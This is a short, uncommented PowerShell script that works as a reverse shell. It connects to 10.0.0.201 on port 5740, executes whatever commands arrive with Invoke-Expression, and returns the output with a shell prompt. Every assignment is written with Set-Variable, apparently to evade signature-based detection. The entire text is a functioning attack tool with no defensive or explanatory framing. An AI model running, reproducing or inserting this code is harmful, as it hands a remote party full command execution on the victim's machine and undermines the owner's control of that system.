Set-Variable -Value (New-Object System.Net.Sockets.TCPClient("10.0.0.201",5740)) -Name client;
Set-Variable -Value ($client.GetStream()) -Name stream;
[byte[]]$bytes = 0..65535|%{0};
while((Set-Variable -Value ($stream.Read($bytes, 0, $bytes.Length)) -Name i) -ne 0){
    ;Set-Variable -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)) -Name data;
    Set-Variable -Value (iex $data 2>&1 | Out-String ) -Name sendback;
    Set-Variable -Value ($sendback + "PS " + (pwd).Path + "> ") -Name sendback2;
    Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()};
$client.Close()